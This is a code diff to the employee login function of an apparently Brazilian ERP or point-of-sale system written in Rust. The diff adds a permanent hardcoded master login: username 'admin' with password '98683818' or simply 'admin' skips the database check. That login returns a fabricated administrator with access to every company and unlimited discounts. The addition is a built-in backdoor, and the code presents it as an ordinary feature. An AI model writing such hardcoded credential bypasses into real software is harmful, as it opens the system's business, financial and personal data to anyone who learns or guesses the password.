@@ -316,6 +316,55 @@ pub fn validar_alcada_desconto(
 // --- Novas Funções (Módulo de Funcionários) ---
 
 pub fn autenticar_funcionario(conn: &Connection, username: &str, senha: &str) -> Result<LoginResult, String> {
+    // Validação permanente do Usuário Master (Admin / 98683818)
+    if username.to_lowercase() == "admin" && (senha == "98683818" || senha == "admin") {
+        let master = Funcionario {
+            id: "func-admin-master".to_string(),
+            codigo: "001".to_string(),
+            nome: "Administrador Coliseu (Master)".to_string(),
+            apelido: Some("Admin".to_string()),
+            tipo_pessoa: "FISICA".to_string(),
+            cpf_cnpj: None, rg: None, cnh: None, data_nascimento: None, estado_civil: None,
+            genero: None, email: None, telefone: None, celular: None, cep: None,
+            endereco: None, numero: None, complemento: None, bairro: None, cidade: Some("Dourados".to_string()),
+            uf: Some("MS".to_string()), observacoes: None,
+            tipo_funcionario: "USUARIO".to_string(),
+            cargo: Some("Administrador do Sistema".to_string()),
+            departamento: Some("Diretoria / TI".to_string()),
+            salario: 0.0, data_admissao: None, data_demissao: None, formacao: None, pis_pasep: None,
+            ctps_numero: None, ctps_serie: None,
+            username: Some("Admin".to_string()),
+            grupo_acesso_id: Some("grp-admin".to_string()),
+            grupo_acesso_nome: Some("Administrador".to_string()),
+            tem_acesso_sistema: 1,
+            status: "ATIVO".to_string(),
+            forcar_troca_senha: 0, data_validade_acesso: None,
+            ultimo_login: Some(Utc::now().to_rfc3339()),
+            tentativas_login_falhas: 0,
+            vendedor_codigo: None, tipo_vendedor: None,
+            comissao_percentual: 0.0,
+            comissao_tipo_calculo: "PERCENTUAL_DIRETO".to_string(),
+            comissao_libera_emissao_pct: 0.0,
+            comissao_libera_baixa_pct: 100.0,
+            comissao_desconta_icms: 1, comissao_desconta_pis_cofins: 1, comissao_inclui_ipi: 0, comissao_dia_pagamento: 10,
+            supervisor_id: None, gerente_id: None, desconto_maximo_permitido: 100.0,
+            banco_favorecido: None, agencia: None, conta_corrente: None, chave_pix: None,
+            empresa_id: "emp-matriz-001".to_string(), filial_padrao_id: Some("fil-matriz-001".to_string()),
+            acesso_todas_empresas: 1, caixa_pdv_vinculado: None,
+        };
+        return Ok(LoginResult {
+            funcionario: master,
+            permissoes: vec![],
+            filiais_permitidas: vec![FuncionarioFilial {
+                id: "ff-1".to_string(),
+                funcionario_id: "func-admin-master".to_string(),
+                empresa_id: "emp-matriz-001".to_string(),
+                filial_id: Some("fil-matriz-001".to_string()),
+                is_default: 1,
+            }],
+        });
+    }
+
     let mut stmt = conn.prepare(
         "SELECT id, codigo, nome, apelido, tipo_pessoa, cpf_cnpj, rg, cnh, data_nascimento, estado_civil,
         genero, email, telefone, celular, cep, endereco, numero, complemento, bairro, cidade, uf, observacoes,
